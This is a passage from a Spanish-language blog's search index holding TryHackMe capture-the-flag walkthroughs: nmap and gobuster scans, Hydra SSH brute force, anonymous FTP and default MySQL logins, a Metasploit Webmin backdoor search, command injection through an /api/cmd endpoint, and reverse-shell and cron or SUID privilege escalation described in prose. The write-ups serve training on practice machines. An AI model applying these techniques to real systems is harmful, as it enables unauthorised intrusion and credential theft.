2020-05-26 03:57:39 | | 0 | Karen Wheeler | +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ 2 rows in set (0.00 sec) ","description":"Blog es una maquina de TryHackMe, presenta retos de esteganografia, ataque de contraseñas y una vulnerabilidad en WordPress para obtener acceso. Con el codigo fuente de una fichero SUID exportamos una variable de entorno que nos devolvio una shell como root.","id":119,"section":"posts","tags":["wordpress","smbclient","steganography","steghide","wpscan","suid"],"title":"TryHackMe - Blog","uri":"https://sckull.github.io/posts/blog/"},{"content":"\rJoyStick es una maquina de TryHackMe, realizamos un ataque de fuerza bruta en el servicio SSH para obtener acceso. Un CronJob nos permitio obtener acceso privilegiado.\nRoom Titulo JoyStick Descripción Anyone want to play? Puntos * Dificultad Facil Maker DarkStar7471 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 # Nmap 7.80 scan initiated Fri Jul 17 00:47:51 2020 as: nmap -sV -o nmap_scan_mini joystick.thm Nmap scan report for joystick.thm (10.10.184.33) Host is up (0.19s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 17 00:48:28 2020 -- 1 IP address (1 host up) scanned in 37.10 seconds FTP Intentamos ingresar con credenciales de anonymous en el servicio de FTP pero nos muestra un mensaje de error.\n1 2 3 4 5 6 7 8 root@upset:~/thm/joystick# ftp joystick.thm Connected to joystick.thm. 220 (vsFTPd 3.0.3) Name (joystick.thm:root): anonymous 500 OOPS: vsftpd: refusing to run with writable root inside chroot() Login failed. ftp\u0026gt; exit 421 Service not available, remote server has closed connection HTTP Encontramos una pagina web en el puerto 80, en el codigo fuente encontramos un mensaje que menciona el usuario steve.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 root@upset:~/thm/joystick# gobuster dir -u http://joystick.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.html (Status: 200) STEVE - USER Utilizamos hydra para hacer un ataque de fuerza bruta en el servicio ssh con el usuario steve y el wordlist rockyou.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 root@upset:~/thm/joystick# hydra -l steve -P /usr/share/wordlists/rockyou.txt ssh://joystick.thm -t 64 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-17 01:12:12 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task [DATA] attacking ssh://joystick.thm:22/ [STATUS] 233.00 tries/min, 233 tries in 00:01h, 14344194 to do in 1026:04h, 64 active [STATUS] 215.00 tries/min, 645 tries in 00:03h, 14343800 to do in 1111:56h, 64 active [STATUS] 210.29 tries/min, 1472 tries in 00:07h, 14342999 to do in 1136:48h, 64 active [STATUS] 207.53 tries/min, 3113 tries in 00:15h, 14341391 to do in 1151:45h, 64 active [STATUS] 343.68 tries/min, 10654 tries in 00:31h, 14333874 to do in 695:08h, 64 active [22][ssh] host: joystick.thm\tlogin: steve password: [... snip ...] ^C Ingresamos por SSH, obtenemos una shell y nuestra flag user.txt\nPRIVILEGE ESCALATION Utilizamos pspy64 para ver los cronjobs que se encuentran en la maquina, encontramos que se ejecuta el archivo /opt/minecraft/backup.sh.\nAgregamos una shell inversa al archivo y ponemos a la escucha netcat en nuestra maquina.\nObtenemos una shell con el usuario root.\nEncontramos la flag root.txt en /home/notch.\n","description":"JoyStick es una maquina de TryHackMe, realizamos un ataque de fuerza bruta en el servicio SSH para obtener acceso. Un CronJob nos permitio obtener acceso privilegiado.","id":120,"section":"posts","tags":["ftp","cron","hydra"],"title":"TryHackMe - JoyStick","uri":"https://sckull.github.io/posts/joystick/"},{"content":"\rOverpass es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos web y analisis de codigo para obtener acceso. Escalamos privilegios con informacion presentada en Crontab.\nRoom Titulo Overpass Descripción What happens when some broke CompSci students make a password manager? Puntos 110 Dificultad Facil Maker NinjaJc01 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 # Nmap 7.80 scan initiated Fri Jul 17 16:58:39 2020 as: nmap -sV -o nmap_scan_mini overpass.thm Nmap scan report for overpass.thm (10.10.144.83) Host is up (0.20s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 17 16:59:17 2020 -- 1 IP address (1 host up) scanned in 37.41 seconds HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 root@upset:~/thm/overpass# gobuster dir -u http://overpass.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.html (Status: 301) /img (Status: 301) /downloads (Status: 301) /aboutus (Status: 301) /admin (Status: 301) /admin.html (Status: 200) /css (Status: 301) /404.html (Status: 200) En admin encontramos un panel, en el codigo fuente de este encontramos un archivo de javascript el cual al enviar el usuario y contraseña este verifica si la respuesta es \u0026quot;Incorrect Credentials\u0026quot;, si ese fuera el caso limpia el input de la contraseña, si la respuesta es diferente entonces establece una cookie con la respuesta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 [ ... REDACTED ...] async function login() { const usernameBox = document.querySelector(\u0026#34;#username\u0026#34;); const passwordBox = document.querySelector(\u0026#34;#password\u0026#34;); const loginStatus = document.querySelector(\u0026#34;#loginStatus\u0026#34;); loginStatus.textContent = \u0026#34;\u0026#34; const creds = { username: usernameBox.value, password: passwordBox.value } const response = await postData(\u0026#34;/api/login\u0026#34;, creds) const statusOrCookie = await response.text() if (statusOrCookie === \u0026#34;Incorrect credentials\u0026#34;) { loginStatus.textContent = \u0026#34;Incorrect Credentials\u0026#34; passwordBox.value=\u0026#34;\u0026#34; } else { Cookies.set(\u0026#34;SessionToken\u0026#34;,statusOrCookie) window.location = \u0026#34;/admin\u0026#34; } } JAMES - USER En este caso no hay un control encuanto a las cookies por lo que podemos establecer una cookie cualquiera o vacia y logramos ver lo que esta restringido, utilizamos burpsuite para establecer la cookie en vacio y logramos ver el contenido, en donde nos muestra una clave privada encriptada y el nombre de un usuario (james).\nUtilizamos ssh2john para obtener el hash y john para obtener la frase del archivo.\nUtilizamos la frase y la clave, logramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con cat /etc/crontab y encontramos un cronjob del usuario root, en el que descarga un archivo bash y lo ejecuta en la direccion overpass.thm.\nEditamos el archivo /etc/hosts y agregamos nuestra ip en lugar de la de overpass.thm.\nCreamos un archivo con una shell inversa, creamos un mini servidor con python3 -m http.server 80, ademas creamos dos carpetas /downloads/src/ en donde estará nuestro archivo de la shell. Esperamos a que haga la solicitud y ejecute nuestro archivo, logramos obtener una shell root y la flag root.txt.\n","description":"Overpass es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos web y analisis de codigo para obtener acceso. Escalamos privilegios con informacion presentada en Crontab.","id":121,"section":"posts","tags":["cron"],"title":"TryHackMe - Overpass","uri":"https://sckull.github.io/posts/overpass/"},{"content":"\rSource es una maquina de TryHackMe donde encontramos Webmin por donde obtuvimos acceso utilizando un exploit de Metasploit.\nRoom Titulo Source Descripción Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Puntos 60 Dificultad Facil Maker DarkStar7471 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (10000) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 # Nmap 7.80 scan initiated Fri Jul 17 02:32:30 2020 as: nmap -sV -o nmap_scan_mini source.thm Nmap scan report for source.thm (10.10.133.161) Host is up (0.15s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 10000/tcp open http MiniServ 1.890 (Webmin httpd) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 17 02:33:40 2020 -- 1 IP address (1 host up) scanned in 69.98 seconds HTTP Encontramos webmin en el puerto 10000.\nMETASPLOIT Utilizamos metasploit en donde encontramos el exploit exploit/unix/webapp/webmin_backdoor y lo usamos en contra la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 msf5 \u0026gt; search webmin Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/webmin/edit_html_fileaccess 2012-09-06 normal No Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access 1 auxiliary/admin/webmin/file_disclosure 2006-06-30 normal No Webmin File Disclosure 2 exploit/linux/http/webmin_packageup_rce 2019-05-16 excellent Yes Webmin Package Updates Remote Command Execution 3 exploit/unix/webapp/webmin_backdoor 2019-08-10 excellent Yes Webmin password_change.cgi Backdoor 4 exploit/unix/webapp/webmin_show_cgi_exec 2012-09-06 excellent Yes Webmin /file/show.cgi Remote Command Execution 5 exploit/unix/webapp/webmin_upload_exec 2019-01-17 excellent Yes Webmin Upload Authenticated RCE msf5 \u0026gt; Logramos obtener una shell con el usuario root.\nTambien encontramos la flag user.txt y root.txt\n","description":"Source es una maquina de TryHackMe donde encontramos Webmin por donde obtuvimos acceso utilizando un exploit de Metasploit.","id":122,"section":"posts","tags":["metasploit"],"title":"TryHackMe - Source","uri":"https://sckull.github.io/posts/source/"},{"content":"\rKoTH Food CTF es una maquina de TryHackMe parte de las maquinas de King of the Hill se presentan algunas formas para obtener acceso y escalar privilegios.\nRoom Titulo KoTH Food CTF Descripción Practice Food KoTH alone, to get familiar with KoTH! Puntos 0 Dificultad Facil Maker NinjaJc01 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (15065), mysql (3306) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 # Nmap 7.80 scan initiated Tue Jul 14 23:33:16 2020 as: nmap -sV -o nmap_scan_mini kothfood.thm Nmap scan report for kothfood.thm (10.10.77.34) Host is up (0.15s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1 9999/tcp open abyss? 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : [... snip ...] Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jul 14 23:35:18 2020 -- 1 IP address (1 host up) scanned in 122.15 seconds # Nmap 7.80 scan initiated Tue Jul 14 23:48:02 2020 as: nmap -sV -p- -T5 -o nmap_scan kothfood.thm Warning: 10.10.132.29 giving up on port because retransmission cap hit (2). Nmap scan report for kothfood.thm (10.10.132.29) Host is up (0.16s latency). Not shown: 65523 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1 9999/tcp open abyss? 15065/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) 16109/tcp open unknown 32229/tcp filtered unknown 46211/tcp filtered unknown 46969/tcp open telnet Linux telnetd 47002/tcp filtered unknown 48690/tcp filtered unknown 48972/tcp filtered unknown 52197/tcp filtered unknown 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : [... snip ...] Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 15 00:01:53 2020 -- 1 IP address (1 host up) scanned in 830.63 seconds Primera Parte A continuacion se muestran los dos caminos (partes) que se encontraron para obtener una shell y escalar privilegios, además el lugar donde se encuentran las flags.\nMYSQL Nos conecatmos en el puerto 3306 con las credenciales por default (root:), en donde encontramos una base de datos (users) que contiene unas credenciales y una flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 MySQL [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | users | +--------------------+ 5 rows in set (0.176 sec) MySQL [(none)]\u0026gt; use users; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MySQL [users]\u0026gt; show tables; +-----------------+ | Tables_in_users | +-----------------+ | User | +-----------------+ 1 row in set (0.152 sec) MySQL [users]\u0026gt; select * from User; +----------+---------------------------------------+ | username | password | +----------+---------------------------------------+ | ramen | ... snip ... | | flag | thm{... snip ...} | +----------+---------------------------------------+ 2 rows in set (0.149 sec) MySQL [users]\u0026gt; RAMEN - USER Utilizamos las credenciales que encontramos en la base de datos en el servicio SSH, logramos obtener una shell.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion en la maquina y encontramos un archivo SUID screen-4.5.0. Ejecutamos el exploit y obtenemos una shell como usuario root.\nObtenemos una flag en la carpeta principal de este usuario.\nBuscamos la flag en el directorio / y logramos encontrar una en /home/bread/flag, /home/tryhackme/flag7 y /var/flag.txt.\nEncontramos otra dentro de la carpeta principal del usuario food (/home/food/.flag).\nVemos los puertos abiertos y nos muestra el puerto 16109, visitamos el puerto y vemos una imagen.\nDescargamos la imagen y extraemos archivos ocultos con steghide sin contraseña, donde encontramos las credenciales del usuario pasta.\nroot@upset:~/thm/kothfood# steghide extract -sf image.jpg Enter passphrase: wrote extracted data to \u0026#34;creds.txt\u0026#34;.\rroot@upset:~/thm/kothfood# cat creds.txt pasta:... snip ...\rroot@upset:~/thm/kothfood# Segunda Parte HTTP Encontramos una pagina web en el puerto 15065.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 root@upset:~/thm/kothfood# gobuster dir -u http://kothfood.thm:15065/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.html (Status: 301) /monitor (Status: 301) En la pagina monitor en donde al pasarle una ip realiza un ping.\nLe pasamos nuestra IP y logramos recibir los paquetes.\nRevisamos el codigo fuente de la pagina y encontramos un archivo de javascript, que, en uno de los comentarios indica que el codigo está ofuscado. Encontramos una funcion que envia la IP a una API.\n1 2 3 4 5 6 7 8 9 10 11 12 async function pingHost() { const _0x25c165 = document[_0x4d67(\u0026#39;0x5\u0026#39;)](\u0026#39;#outputSection\u0026#39;); const _0x2e78af = document[_0x4d67(\u0026#39;0x5\u0026#39;)](_0x4d67(\u0026#39;0x2\u0026#39;)); const _0x1185f3 = _0x2e78af[_0x4d67(\u0026#39;0x1\u0026#39;)]; if (_0x1185f3 !== undefined \u0026amp;\u0026amp; _0x1185f3 !== \u0026#39;\u0026#39; \u0026amp;\u0026amp; ValidateIPaddress(_0x1185f3)) { _0x25c165[_0x4d67(\u0026#39;0x0\u0026#39;)] = _0x4d67(\u0026#39;0x6\u0026#39;) + _0x1185f3 + \u0026#39;\\x0a\u0026#39;; const _0x27c227 = await postData(\u0026#39;/api/cmd\u0026#39;, \u0026#39;ping -c 4 \u0026#39; + _0x1185f3); _0x25c165[\u0026#39;textContent\u0026#39;] += await _0x27c227[\u0026#39;text\u0026#39;](); } else { _0x25c165[_0x4d67(\u0026#39;0x0\u0026#39;)] = _0x4d67(\u0026#39;0x4\u0026#39;); } } Enviamos un comando mediante el metodo POST utilizando CURL y logramos obtener el resultado.\nEjecutamos una shel inversa y logramos obtener una shell inversa con el usuario BREAD.\nGeneramos claves SSH para el usuario bread.\nAdemás agregamos nuestra clave en el archivo authorized_keys.\nIngresamos por el servicio ssh y enumeramos la maquina para buscar archivos para escalar privilegios.\n-rwsr-xr-x 1 root root 8.3K Jul 15 05:07 /tmp/rootshell\r-rwsr-sr-x 1 daemon daemon 51K Feb 20 2018 /usr/bin/at\r-rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/chfn\r-rwsr-xr-x 1 root root 44K Mar 22 2019 /usr/bin/chsh\r-rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/gpasswd\r-rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newgidmap\r-rwsr-xr-x 1 root root 40K Mar 22 2019 /usr/bin/newgrp\r-rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newuidmap\r-rwsr-xr-x 1 root root 59K Mar 22 2019 /usr/bin/passwd\r-rwsr-xr-x 1 root root 22K Mar 27 2019 /usr/bin/pkexec\r-rwsr-xr-x 1 root root 1.6M Mar 20 03:04 /usr/bin/screen-4.5.0\r-rwsr-xr-x 1 root root 146K Jan 18 2018 /usr/bin/sudo\r-rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils\r-rwsr-sr-x 1 root root 2.6M Jun 6 2019 /usr/bin/vim.basic\r-rwsr-xr-- 1 root messagebus 42K Jun 10 2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\r-rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device\r-rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign\r-rwsr-xr-x 1 root root 14K Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1\r-rwsr-sr-x 1 root root 107K Oct 30 2019 /usr/lib/snapd/snap-confine\r-rwsr-xr-- 1 root telnetd 11K Nov 7 2016 /usr/lib/telnetlogin\r-rwsr-xr-x 1 root root 99K Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic Encontramos un binario que al ejecutarlo /tmp/rootshell nos devuelve una shell como usuario root.\n","description":"KoTH Food CTF es una maquina de TryHackMe parte de las maquinas de King of the Hill se presentan algunas formas para obtener acceso y escalar privilegios.","id":123,"section":"posts","tags":[],"title":"TryHackMe - KoTH Food CTF","uri":"https://sckull.github.io/posts/kothfood/"},{"content":"\rKoTH Hackers es una maquina de TryHackMe parte de las maquinas de King of the Hill se presentan algunas formas para obtener acceso y escalar privilegios.\nRoom Titulo KoTH Hackers Descripción The Hackers KoTH box, to allow you to practice alone! Puntos 0 Dificultad Media Maker NinjaJc01 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 # Nmap 7.80 scan initiated Fri Jul 10 16:49:57 2020 as: nmap -sV -p- -T5 -o nmap_scan kothhacker.thm Warning: 10.10.130.16 giving up on port because retransmission cap hit (2). Nmap scan report for kothhacker.thm (10.10.130.16) Host is up (0.15s latency). Not shown: 65488 closed ports, 43 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) 9999/tcp open abyss? 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9999-TCP:V=7.80%I=7%D=7/10%Time=5F08E4C8%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,75,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Fri,\\x2010\\x20Jul\\x2020 SF:20\\x2021:59:36\\x20GMT\\r\\nContent-Length:\\x201\\r\\nContent-Type:\\x20text/ SF:plain;\\x20charset=utf-8\\r\\n\\r\\n\\n\u0026#34;)%r(HTTPOptions,75,\u0026#34;HTTP/1\\.0\\x20200\\ SF:x20OK\\r\\nDate:\\x20Fri,\\x2010\\x20Jul\\x202020\\x2021:59:36\\x20GMT\\r\\nConte SF:nt-Length:\\x201\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\\r\\ SF:n\\n\u0026#34;)%r(FourOhFourRequest,75,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Fri,\\x SF:2010\\x20Jul\\x202020\\x2021:59:37\\x20GMT\\r\\nContent-Length:\\x201\\r\\nConte SF:nt-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\\r\\n\\n\u0026#34;)%r(GenericLines,67, SF:\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20 SF:charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r( SF:RTSPRequest,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20 SF:text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\ SF:x20Request\u0026#34;)%r(Help,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-T SF:ype:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400 SF:\\x20Bad\\x20Request\u0026#34;)%r(SSLSessionReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Req SF:uest\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x2 SF:0close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TerminalServerCookie,67,\u0026#34;HTTP/1 SF:\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset SF:=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TLSSess SF:ionReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/ SF:plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Re SF:quest\u0026#34;)%r(Kerberos,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Ty SF:pe:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\ SF:x20Bad\\x20Request\u0026#34;)%r(LPDString,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\ SF:r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20clos SF:e\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(LDAPSearchReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x SF:20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nCo SF:nnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(SIPOptions,67,\u0026#34;HTTP SF:/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20chars SF:et=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 10 17:01:09 2020 -- 1 IP address (1 host up) scanned in 671.62 seconds HTTP Encontramos una pagina web en el puerto 80.\nAl revisar las hojas de estilo de la pagina, encontramos una flag.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 root@upset:~/thm/kothhacker# gobuster dir -u http://kothhacker.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /backdoor (Status: 301) /contact (Status: 301) /img (Status: 301) /index.html (Status: 301) /index.html (Status: 301) /news (Status: 301) /robots.txt (Status: 200) /robots.txt (Status: 200) /staff (Status: 301) Vemos que en backdoor existe un formulario de autenticacion.\nRevisamos el codigo fuente de esta pagina y encontramos un archivo javascript que realiza la autenticacion y que si esta es correcta redirige hacia otra pagina.\n1 2 3 4 5 6 7 if (statusOrCookie=== \u0026#34;Incorrect credentials\u0026#34;) { alert(\u0026#34;Incorrect Credentials\u0026#34;) passwordBox.value=\u0026#34;\u0026#34; } else { Cookies.set(\u0026#34;SessionToken\u0026#34;,statusOrCookie) window.location = \u0026#34;/backdoor/shell\u0026#34; } /backdoor/shell es la pagina a la que nos redirige, analizamos la pagina y vemos que al visitarla nos redirige nuevamente al /, por lo que solo podemos leer el codigo fuente, en este ultimo encontramos un archivo Javascript en donde nuevamente verifica la auntenticacion con una cookie. Pero lo interesante es de que contiene un formulario en donde se pueden \u0026ldquo;ejecutar comandos\u0026rdquo; y lo hace mediante una api.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 async function runCommand(commandText) { if (commandText === \u0026#34;exit\u0026#34;) { Cookies.set(\u0026#34;SessionToken\u0026#34;,\u0026#34;\u0026#34;) window.location = \u0026#34;/\u0026#34; return } const outputBox = document.getElementById(\u0026#34;outputBox\u0026#34;); if (commandText === \u0026#34;clear\u0026#34;) { outputBox.textContent = \u0026#34;\u0026#34; return } outputBox.textContent += \u0026#34;plague@gibson:$ \u0026#34; + commandText + \u0026#34;\\n\u0026#34; outputBox.textContent += await (await postData(\u0026#34;/api/cmd\u0026#34;, commandText)).text() window.scrollBy(0, 1000); } FTP Utilizamos las \u0026ldquo;credenciales\u0026rdquo; de anonymous (anonymous:anonymous) para ingresar por el servicio FTP, en donde logramos encontrar dos archivos, el primero contiene una flag y el segundo una nota.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 root@upset:~/thm/kothhacker# ftp kothhacker.thm Connected to kothhacker.thm. 220-Ellingson Mineral Company FTP Server 220- 220-WARNING 220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986 220 Name (kothhacker.thm:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Apr 30 04:42 . drwxr-xr-x 2 ftp ftp 4096 Apr 30 04:42 .. -rw-r--r-- 1 ftp ftp 38 Apr 30 04:42 .flag -rw-r--r-- 1 ftp ftp 400 Apr 29 03:57 note 226 Directory send OK. ftp\u0026gt; get .flag local: .flag remote: .flag 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for .flag (38 bytes). 226 Transfer complete. 38 bytes received in 0.00 secs (189.3336 kB/s) ftp\u0026gt; get note local: note remote: note 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for note (400 bytes). 226 Transfer complete. 400 bytes received in 0.00 secs (3.4060 MB/s) ftp\u0026gt; exit 221 Goodbye. root@upset:~/thm/kothhacker# cat note Note: Any users with passwords in this list: love sex god secret will be subject to an immediate disciplinary hearing. Any users with other weak passwords will be complained at, loudly. These users are: rcampbell:Robert M. Campbell:Weak password gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password Exposing the company\u0026#39;s cryptographic keys is a disciplinary offense. Eugene Belford, CSO root@upset:~/thm/kothhacker# RCAMPBELL - SSH/HYDRA En la nota encontramos dos nombres de usuario en donde mencionan que tienen contraseñas debiles. Creamos un archivo de texto (users.txt) para utilizarlo junto con Hydra en el servicio ssh con el wordlist rockyou, y logramos obtener la contraseña para el usuario rcampbell y además el usuario gcrawford al parecer no tiene activado el acceso por este servicio.\nLogramos obtener una shell con el usuario rcampbell y una flag.\nRevisando los archivos FTP de configuracion encontramos otra flag.\nNo logramos encontrar ningun archivo que nos ayudara para escalar privilegios por lo que utilizamos nuevamente HYDRA con los usuarios encontrados en el servicio FTP. Logramos encontrar la misma contraseña para rcampbell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 root@upset:~/thm/kothhacker# ftp kothhacker.thm Connected to kothhacker.thm. 220-Ellingson Mineral Company FTP Server 220- 220-WARNING 220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986 220 Name (kothhacker.thm:root): rcampbell 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 